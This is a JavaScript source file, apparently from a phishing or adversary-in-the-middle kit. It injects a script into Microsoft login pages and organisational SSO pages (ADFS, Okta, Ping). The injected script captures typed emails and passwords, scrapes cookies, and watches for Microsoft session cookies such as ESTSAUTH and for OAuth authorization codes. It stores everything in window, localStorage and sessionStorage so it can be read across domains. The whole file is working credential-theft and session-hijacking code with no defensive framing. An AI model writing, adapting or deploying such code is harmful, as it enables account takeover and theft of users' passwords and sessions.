/**
 * CRITICAL FIX: Enhanced Password & Email Capture Injector
 * Captures cookies WHILE ON MICROSOFT DOMAIN
 * Stores in window object for cross-domain access
 */
export function injectPasswordCaptureScript() {
  const hostname = window.location.hostname;
  const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
    hostname.includes('login.live.com') ||
    hostname.includes('account.microsoft.com') ||
    hostname.includes('login.microsoft.com') ||
    hostname.includes('outlook.live.com');

  const isOrgDomain = hostname.includes('adfs') ||
    hostname.includes('sso') ||
    hostname.includes('okta') ||
    hostname.includes('ping') ||
    document.querySelector('input[type="password"]');

  if (isMicrosoftDomain || isOrgDomain) {
    const script = document.createElement('script');

    script.textContent = (function(){/*
      (function() {
        console.log('🔧 Password capture injector initialized on:', window.location.hostname);
        
        // CRITICAL: Set up window object for cross-domain cookie storage
        window.__CAPTURED_DATA__ = {
          cookies: [],
          credentials: {},
          timestamp: new Date().toISOString(),
          domain: window.location.hostname
        };
        
        function captureMicrosoftCookies() {
          try {
            const cookieString = document.cookie;
            if (!cookieString) {
              console.log('⚠️ No cookies found on:', window.location.hostname);
              return [];
            }

            const cookies = [];
            const cookiePairs = cookieString.split(';');

            console.log('🔍 Parsing', cookiePairs.length, 'cookie pairs...');

            cookiePairs.forEach(pair => {
              const trimmed = pair.trim();
              if (trimmed) {
                const equalsIndex = trimmed.indexOf('=');
                if (equalsIndex > 0) {
                  const name = trimmed.substring(0, equalsIndex).trim();
                  const value = trimmed.substring(equalsIndex + 1).trim();
                  
                  if (name && value) {
                    console.log('✅ Cookie found:', name, '- Length:', value.length);
                    
                    cookies.push({
                      name: name,
                      value: value,
                      domain: window.location.hostname,
                      path: '/',
                      secure: window.location.protocol === 'https:',
                      httpOnly: false,
                      sameSite: 'Lax',
                      session: true,
                      captureTime: new Date().toISOString()
                    });
                  }
                }
              }
            });

            console.log('🍪 Total cookies captured:', cookies.length);
            return cookies;
          } catch (error) {
            console.error('❌ Failed to capture cookies:', error);
            return [];
          }
        }

        function getStoredCredentials() {
          try {
            const storageKeys = [
              'replacement_credentials',
              'captured_credentials', 
              'form_credentials',
              'injected_credentials'
            ];
            
            for (const key of storageKeys) {
              const localData = localStorage.getItem(key);
              const sessionData = sessionStorage.getItem(key);
              
              if (localData) {
                try {
                  const parsed = JSON.parse(localData);
                  if (parsed.email || parsed.password) {
                    console.log('✅ Found credentials in localStorage:', key);
                    return parsed;
                  }
                } catch (e) {
                  // ignore
                }
              }
              
              if (sessionData) {
                try {
                  const parsed = JSON.parse(sessionData);
                  if (parsed.email || parsed.password) {
                    console.log('✅ Found credentials in sessionStorage:', key);
                    return parsed;
                  }
                } catch (e) {
                  // ignore
                }
              }
            }
            
            return null;
          } catch (error) {
            console.warn('⚠️ Failed to retrieve stored credentials:', error);
            return null;
          }
        }

        let capturedCredentials = {
          email: '',
          password: '',
          username: '',
          domain: window.location.hostname,
          captureTime: new Date().toISOString()
        };

        let lastStoreAt = 0;
        function storeDataNow() {
          const now = Date.now();
          if (now - lastStoreAt < 1000) return false;
          lastStoreAt = now;
          return true;
        }

        // CRITICAL: Store to all possible locations
        function storeAllData() {
          if (!storeDataNow()) return;

          console.log('📦 Storing data to all locations...');

          try {
            // Capture cookies NOW, while on Microsoft domain
            const capturedCookies = captureMicrosoftCookies();
            console.log('📊 Captured cookies:', capturedCookies.length);

            // Update window object
            window.__CAPTURED_DATA__ = {
              cookies: capturedCookies,
              credentials: capturedCredentials,
              timestamp: new Date().toISOString(),
              domain: window.location.hostname,
              cookieCount: capturedCookies.length
            };

            console.log('💾 Updated window.__CAPTURED_DATA__');

            // Store to localStorage (persists across navigation)
            if (capturedCookies.length > 0) {
              const cookieExport = {
                version: '1.0',
                exportedAt: new Date().toISOString(),
                source: 'password-capture-injector',
                domain: window.location.hostname,
                totalCookies: capturedCookies.length,
                cookies: capturedCookies,
                note: 'Captured on Microsoft domain'
              };

              try {
                localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                localStorage.setItem('captured_cookies', JSON.stringify(capturedCookies));
                sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                sessionStorage.setItem('captured_cookies', JSON.stringify(capturedCookies));
                
                console.log('✅ Stored', capturedCookies.length, 'cookies to localStorage/sessionStorage');
              } catch (e) {
                console.error('❌ Failed to store to storage:', e);
              }
            } else {
              console.warn('⚠️ No cookies to store');
            }

            // Store credentials
            if (capturedCredentials.email || capturedCredentials.password) {
              const credsData = {
                email: capturedCredentials.email,
                password: capturedCredentials.password,
                username: capturedCredentials.username,
                domain: window.location.hostname,
                source: 'injected-password-capture',
                timestamp: new Date().toISOString()
              };

              try {
                localStorage.setItem('captured_credentials', JSON.stringify(credsData));
                localStorage.setItem('replacement_credentials', JSON.stringify(credsData));
                sessionStorage.setItem('captured_credentials', JSON.stringify(credsData));
                sessionStorage.setItem('replacement_credentials', JSON.stringify(credsData));
                
                console.log('✅ Stored credentials');
              } catch (e) {
                console.error('❌ Failed to store credentials:', e);
              }
            }

          } catch (error) {
            console.error('❌ Error in storeAllData:', error);
          }
        }

        function capturePasswordFromForms() {
          try {
            const passwordFields = document.querySelectorAll('input[type="password"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[name*="username"]');

            let hasNewData = false;

            passwordFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.password) {
                console.log('🔐 Password captured');
                capturedCredentials.password = field.value;
                hasNewData = true;
              }
            });

            emailFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.email) {
                console.log('📧 Email captured:', field.value);
                capturedCredentials.email = field.value;
                hasNewData = true;
              }
            });

            if (hasNewData) {
              console.log('📝 New data detected, storing...');
              storeAllData();
            }

            return hasNewData;
          } catch (error) {
            console.error('❌ Error capturing password:', error);
            return false;
          }
        }

        function monitorLogin() {
          console.log('🔍 Monitoring login on:', window.location.hostname);
          
          // Store immediately
          setTimeout(() => {
            console.log('⏰ Initial store attempt...');
            storeAllData();
          }, 1500);

          // Check for success indicators
          let checkCount = 0;
          const checkInterval = setInterval(() => {
            checkCount++;
            
            // Check for auth cookies or success indicators
            const hasAuthCookie = document.cookie.includes('ESTSAUTH') || 
                                 document.cookie.includes('ESTSAUTHPERSISTENT') ||
                                 document.cookie.includes('ESTSAUTHLIGHT') ||
                                 document.cookie.includes('SignInStateCookie');
            
            const hasCodeParam = window.location.href.includes('code=');
            const hasSuccessIndicator = hasAuthCookie || hasCodeParam;

            if (hasSuccessIndicator || checkCount >= 40) {
              clearInterval(checkInterval);
              console.log('🎯 Login flow complete, final store...');
              storeAllData();
              
              if (hasAuthCookie) {
                console.log('✅ Auth cookie detected!');
              }
              if (hasCodeParam) {
                console.log('✅ Authorization code in URL!');
              }
            }
          }, 500);
        }

        // Event listeners
        document.addEventListener('input', (e) => {
          if (e.target.type === 'password' || e.target.type === 'email') {
            setTimeout(() => capturePasswordFromForms(), 200);
          }
        });

        document.addEventListener('submit', (e) => {
          console.log('📝 Form submitted');
          capturePasswordFromForms();
          setTimeout(() => storeAllData(), 500);
        });

        document.addEventListener('click', (e) => {
          const target = e.target;
          if (target.type === 'submit' || 
              (target.textContent && (target.textContent.toLowerCase().includes('sign in') || target.textContent.toLowerCase().includes('next')))) {
            console.log('🖱️ Button clicked, storing data...');
            capturePasswordFromForms();
            setTimeout(() => storeAllData(), 800);
          }
        });

        // Initialize
        function init() {
          console.log('🚀 Initializing on:', window.location.hostname);
          monitorLogin();
          
          // Periodic store
          setInterval(() => {
            capturePasswordFromForms();
            storeAllData();
          }, 3000);
        }

        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', init);
        } else {
          init();
        }

        console.log('✅ Injector ready - will capture cookies from this domain:', window.location.hostname);
      })();
    */}).toString().replace(/^[\s\S]*?\/\*([\s\S]*?)\*\/[\s\S]*$/,'$1');

    document.head.appendChild(script);
    console.log('✅ Injector script loaded for:', hostname);
  }
}
